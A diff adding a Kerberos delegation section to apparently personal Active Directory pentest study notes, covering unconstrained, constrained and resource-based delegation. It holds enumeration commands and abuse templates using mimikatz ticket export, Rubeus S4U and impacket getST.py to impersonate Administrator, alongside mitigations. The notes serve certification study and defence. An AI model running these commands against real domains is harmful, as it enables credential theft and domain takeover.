@@ -110,6 +110,40 @@ ntlmrelayx.py -tf targets.txt -smb2support    # relay (add --escalate-user / -c 
 
 > These five are the backbone of internal pentests: Printer Bug/NTLM relay get you from low-priv to a hash/foothold, DCSync gets krbtgt, Golden Ticket keeps it forever. Shadow Credentials is the stealthy modern takeover-a-user move.
 
+## Kerberos Delegation (reference)
+Delegation lets a service authenticate *as a user* to another service (for SSO). Misconfigured = privesc / domain takeover. Three types, worst to best:
+
+### Unconstrained delegation (most dangerous)
+The service can store **any** user's TGT. Compromise such a host, wait for (or coerce, via Printer Bug) a privileged user to authenticate, then extract their TGT → impersonate them (incl. DA).
+```powershell
+# find (userAccountControl TRUSTED_FOR_DELEGATION = 0x80000)
+Get-ADComputer -Filter {TrustedForDelegation -eq $true}
+# on the host (SYSTEM): mimikatz  sekurlsa::tickets /export   → reuse the TGT
+```
+**Mitigate:** avoid it; never on DCs; mark sensitive accounts "not delegated" / Protected Users.
+
+### Constrained delegation
+Service can delegate only to **specific SPNs** (`msDS-AllowedToDelegateTo`). If you control such an account, you can use **S4U2Self + S4U2Proxy** to get a ticket as any user to those services.
+```powershell
+Get-ADObject -LDAPFilter "(msDS-AllowedToDelegateTo=*)"
+# abuse: Rubeus s4u  /user:<svc> /rc4:<hash> /impersonateuser:Administrator /msdsspn:<spn> /ptt
+#    or: impacket getST.py -spn <spn> -impersonate Administrator <domain>/<svc>:<pass>
+```
+Note: "protocol transition" variants let you impersonate without the user authenticating. Mitigate: restrict to trusted services, strong service-account passwords.
+
+### Resource-Based Constrained Delegation (RBCD)
+The **target resource** decides who may delegate to it (`msDS-AllowedToActOnBehalfOfOtherIdentity`). If you have **write rights over a computer object** (common via BloodHound), set RBCD to a machine account you control, then S4U to impersonate any user to that target.
+```powershell
+Get-ADComputer -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -ne "$null"}
+# chain: control/create a computer account → set RBCD on victim to point to it →
+#        Rubeus s4u (or getST.py -impersonate) → ticket as Administrator to the victim → psexec/wmiexec
+```
+**Mitigate:** monitor `msDS-AllowedToActOnBehalfOfOtherIdentity` changes; restrict who can write computer object attributes.
+
+**Delegation vs Kerberoasting:** delegation abuse = privilege escalation via misconfigured delegation accounts (tools: Rubeus, PowerView, impacket; risk: domain takeover). Kerberoasting = offline cracking of SPN account passwords (tools: GetUserSPNs.py, hashcat; risk depends on password strength). Different attacks, both target service accounts.
+
+> RBCD is the modern go-to: BloodHound finds "you have write over this computer," and that single edge turns into SYSTEM on it via the RBCD → S4U chain.
+
 ## AD attack catalog (by phase — study/coverage index)
 The full menu. Commands for the core ones are in the attack-flow above; this is the map so I know what exists and when it applies. **CPTS focus = the post-access AD attacks** (credential dumping → privesc → lateral → persistence). Initial-access social/physical and Azure/cloud items are mostly red-team / cloud scope — know the names, but they're outside core CPTS.
 
